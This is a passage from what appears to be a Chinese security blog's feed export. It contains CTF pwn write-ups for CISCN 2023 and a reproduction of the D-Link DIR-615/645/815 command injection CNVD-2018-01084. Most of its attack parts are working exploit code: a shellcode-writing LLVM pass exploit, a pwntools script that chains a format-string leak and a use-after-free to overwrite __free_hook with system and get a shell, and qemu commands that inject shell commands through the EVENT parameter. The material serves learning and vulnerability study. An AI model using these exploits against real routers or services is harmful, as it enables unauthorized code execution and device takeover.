wp.ll</span><br><span class="hljs-comment">//./opt-10 -load ./LLVMHello.so -Hello ./wp.ll</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Edit</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> data)</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Del</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Alloc</span><span class="hljs-params">()</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">EditAlloc</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> offset)</span>&#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l1s00t</span><span class="hljs-params">()</span><br>&#123;<br>Alloc();<br><br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xb848686a</span>);  <br>    Edit(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x6e69622f</span>);  <br>    Edit(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x732f2f2f</span>);  <br>    Edit(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xe7894850</span>);  <br>    Edit(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01697268</span>);  <br>    Edit(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x24348101</span>);  <br>    Edit(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01010101</span>);  <br>    Edit(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x6a56f631</span>);  <br>    Edit(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01485e08</span>);  <br>    Edit(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x894856e6</span>);  <br>    Edit(<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x6ad231e6</span>);  <br>    Edit(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x050f583b</span>);  <br><br>EditAlloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">0</span>);<br>EditAlloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">1</span>);<br>EditAlloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">2</span>);<br>EditAlloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">3</span>);<br>EditAlloc(<span class="hljs-number">4</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">4</span>);<br>EditAlloc(<span class="hljs-number">5</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">5</span>);<br>EditAlloc(<span class="hljs-number">6</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">6</span>);<br>EditAlloc(<span class="hljs-number">7</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">7</span>);<br>EditAlloc(<span class="hljs-number">8</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">8</span>);<br>EditAlloc(<span class="hljs-number">9</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">9</span>);<br>EditAlloc(<span class="hljs-number">10</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">10</span>);<br>EditAlloc(<span class="hljs-number">11</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">11</span>);<br><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 12</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 13</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 14</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 15</span><br><br>Del(<span class="hljs-number">14</span>);<br>Del(<span class="hljs-number">13</span>);<br><br>Edit(<span class="hljs-number">12</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x78B108</span>);<br><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 13</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 14</span><br><br>Edit(<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x10000</span>);<br>Edit(<span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708144514375.png" alt="image-20230708144514375"></p><p>Tips：获取shellcode的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(shellcode) % <span class="hljs-number">4</span>:<br>    shellcode += <span class="hljs-built_in">len</span>(shellcode) % <span class="hljs-number">4</span> * <span class="hljs-string">b&#x27;\x90&#x27;</span><br><br>res = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(shellcode), <span class="hljs-number">0x4</span>):<br>    res.append(shellcode[i:i + <span class="hljs-number">4</span>])<br><br><br><span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> res:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u32(code)))<br><br></code></pre></td></tr></table></figure><h2 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h2><p>这道题比赛时应该有挺多师傅写出来了。一开始我只顾着逆结构体去了，也没有修漏洞，结果我们pwn靶机被打了，然后笔者直接上了沙盒才避免进一步掉分。最后只发现了一个uaf漏洞，太紧张了也没有利用起来。最那啥的是，当时竟然没有看到格式化字符串漏洞，还是太菜了。</p><p>检查保护。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708151938597.png" alt="image-20230708151938597"></p><p>保护全开。</p><p>笔者逆出来的结构体大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mycmd</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int32_t</span> is_file;<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">16</span>];<br>  <span class="hljs-type">char</span> *content;<br>  <span class="hljs-type">char</span> *prev;<br>  <span class="hljs-type">char</span> *next;<br>  <span class="hljs-type">char</span> *prev_dir;<br>  <span class="hljs-type">char</span> *head;<br>&#125;;<br></code></pre></td></tr></table></figure><p>rm函数存在uaf漏洞</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152134821.png" alt="image-20230708152134821"></p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152201071.png" alt="image-20230708152201071"></p><p>删除content时，没有清空。同时，删除管理头时，仅仅删除了前后指针。</p><p>echo函数存在格式化字符串漏洞。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152339949.png" alt="image-20230708152339949"></p><p>这两个漏洞都算是比较好利用的，既可以结合使用，也可以单独利用。</p><p>最终wp(UAF)如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;$ &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>attack(<span class="hljs-string">&quot;touch l1s00t&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;%11$p %15$p %7$p&#x27;</span><br>attack(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;payload&#125;</span> l1s00t&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xa036e</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>codebase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x2820</span><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, codebase)<br><br>heapbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x510</span><br>lg(<span class="hljs-string">&#x27;heapbase&#x27;</span>, heapbase)<br><br><span class="hljs-comment"># test uaf</span><br><span class="hljs-comment"># attack(&quot;mkdir l1&quot;)</span><br><span class="hljs-comment"># attack(&quot;cd l1&quot;)</span><br><span class="hljs-comment"># attack(&quot;touch f1&quot;)</span><br><span class="hljs-comment"># attack(&quot;touch f2&quot;)</span><br><span class="hljs-comment"># attack(&quot;touch f3&quot;)</span><br><br><span class="hljs-comment"># attack(&quot;echo l1s00t &gt; f1&quot;)</span><br><span class="hljs-comment"># attack(&quot;rm f1&quot;)</span><br><br><span class="hljs-comment"># attack(&quot;touch f4&quot;)</span><br><span class="hljs-comment"># attack(&quot;rm f4&quot;)</span><br><br>attack(<span class="hljs-string">&quot;mkdir l2&quot;</span>)<br>attack(<span class="hljs-string">&quot;cd l2&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    attack(<span class="hljs-string">f&quot;touch f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>    attack(<span class="hljs-string">f&quot;echo aaaaaaaa &gt; f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    attack(<span class="hljs-string">f&quot;rm f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;rm f7&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;touch f10&quot;</span>)<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>payload = p64(free_hook - <span class="hljs-number">8</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)[:<span class="hljs-number">6</span>].encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>payload = payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>attack(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;payload&#125;</span> &gt; f10&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    attack(<span class="hljs-string">f&quot;touch f<span class="hljs-subst">&#123;<span class="hljs-number">11</span> + i&#125;</span>&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;cat f17&quot;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>attack(<span class="hljs-string">&quot;touch f20&quot;</span>)<br>attack(<span class="hljs-string">&quot;echo ccccccc &gt; f20&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;touch f21&quot;</span>)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = <span class="hljs-string">b&quot;/bin/sh;&quot;</span> + p64(system).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)[:<span class="hljs-number">6</span>].encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>payload = payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>attack(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;payload&#125;</span> &gt; f21&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;rm f21&quot;</span>)<br><br><span class="hljs-comment"># dbg()</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152603676.png" alt="image-20230708152603676"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNVD-2018-01084-Dlink远程命令执行漏洞</title>
    <link href="/2023/07/03/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/07/03/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="CNVD-2018-01084-Dlink远程命令执行漏洞"><a href="#CNVD-2018-01084-Dlink远程命令执行漏洞" class="headerlink" title="CNVD-2018-01084-Dlink远程命令执行漏洞"></a>CNVD-2018-01084-Dlink远程命令执行漏洞</h1><p>CNVD-2018-01084是D-Link DIR 615&#x2F;645&#x2F;815路由器1.03及之前的固件版本存在远程命令执行漏洞。该漏洞是由于service.cgi中拼接了HTTP POST请求中的数据，造成后台命令拼接，导致可执行任意命令。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>由CNVD可知，漏洞点在<code>service.cgi</code> 中，我们直接分析<code>servicecgi_main</code> 即可。</p><p><strong>servicecgi_main</strong></p><p>首先，获取环境变量<code>REQUEST_METHOD</code>的值，若为<strong>post</strong>请求，则顺序执行；若为<strong>get</strong>请求，则跳转到LABEL_10，会直接越过了漏洞点，所以我们需要执行<strong>post</strong>请求。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230703211741239.png" alt="image-20230703211741239"></p><p>接着，调用<code>cgibin_parse_request</code>函数，该函数已经在笔者<a href="https://lst-oss.github.io/2023/07/02/dir-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">上一篇文章</a>中分析过了，就不再赘述了。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230703212031069.png" alt="image-20230703212031069"></p><p>这里，我们主要看看<code>sub_40A63C</code>这个函数。当<strong>URI</strong>参数被解析后，调用该函数对<code>off_42c120</code>进行初始化。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230703223620711.png" alt="image-20230703223620711"></p><p>我们再看看<code>sub_403b10</code>函数。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704091221215.png" alt="image-20230704091221215"></p><p>这个函数也很简单，判断**application&#x2F;**类型，若是匹配上了调用<code>sub_203ffc</code>函数。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704091316062.png" alt="image-20230704091316062"></p><p><code>sub_203ffc</code>函数应该是获取post请求的内容，同时调用<code>sub_402b40</code>对输入的内容进行划分。需要注意的是这里也会对<code>off_42c120</code>进行初始化。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704091457433.png" alt="image-20230704091457433"></p><p>让我们回到主函数里面。接着，会调用<code>sess_ispoweruser</code> 进行用户判断。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085131038.png" alt="image-20230704085131038"></p><p>这个函数仅仅是对<code>sess_validate</code> 函数的简单封装。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085253125.png" alt="image-20230704085253125"></p><p><code>sess_validate</code>函数会打开<strong>sesscfg</strong>，<strong>session%d</strong>等大量session文件，直到匹配为止。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085804332.png" alt="image-20230704085804332"></p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085737003.png" alt="image-20230704085737003"></p><p>这里模拟的固件一般不具备seesion，我们把这个函数判断patch掉即可。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704090044509.png" alt="image-20230704090044509"></p><p>之后会调用<code>sub_40A1C0</code>匹配EVENT、ACTION与SERVICE。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704090138244.png" alt="image-20230704090138244"></p><p>这个函数也比较简单，就是对我们输入内容与EVENT等进行匹配。若匹配上，则返回输入的内容。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704090257048.png" alt="image-20230704090257048"></p><p>最后，执行<code>lxmldbc_system</code>函数，也就是可以命令注入的函数。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704092222684.png" alt="image-20230704092222684"></p><p>该函数就是将我们的输入复制到<strong>acStack_40c</strong>变量中，然后执行。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704092350052.png" alt="image-20230704092350052"></p><p>这里并未对输入进行过滤，也就是存在任意命令执行漏洞。</p><p>至此，分析完毕。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据上面分析，可知这里存在两条执行路径。</p><p>第一条，利用URI进行任意命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">input=&quot;l1s00t&quot;<br>cmd=&quot;|| ls;&quot;<br><br>echo $input | qemu-mipsel -L . \<br>    -0 &quot;service.cgi&quot; \<br>    -E REQUEST_METHOD=&quot;POST&quot; \<br>    -E REQUEST_URI=&quot;l1s00t?EVENT=$cmd&quot; \<br>    -E CONTENT_LENGTH=`echo -n $input | wc -c` \<br>    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \<br>    ./htdocs/cgibin<br><br></code></pre></td></tr></table></figure><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704093231095.png" alt="image-20230704093231095"></p><p>第二条，通过post请求输入内容进行任意命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">input=&quot;EVENT=|| pwd; #&quot;<br>cmd=&quot;|| ls;&quot;<br><br>echo $input | qemu-mipsel -L . \<br>    -0 &quot;service.cgi&quot; \<br>    -E REQUEST_METHOD=&quot;POST&quot; \<br>    -E REQUEST_URI=&quot;l1s00t?EVENT=$cmd&quot; \<br>    -E CONTENT_LENGTH=`echo -n $input | wc -c` \<br>    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \<br>    ./htdocs/cgibin<br><br></code></pre></td></tr></table></figure><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704093344171.png" alt="image-20230704093344171"></p><p>同时，也可以看到，我们post输入的内容是可以覆盖URI的。与上面的分析也不谋而合。</p><p>这里，我们使用调试查看命令执行过程。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704093726056.png" alt="image-20230704093726056"></p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704094032648.png" alt="image-20230704094032648"></p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704094118204.png" alt="image-20230704094118204"></p><p>至此，漏洞复现完毕。</p><p>参考文章：</p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084</a></p><p><a href="https://bbs.kanxue.com/thread-272212.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-272212.htm#msg_header_h1_0</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dir-815 栈溢出漏洞复现</title>
    <link href="/2023/07/02/dir-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/07/02/dir-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
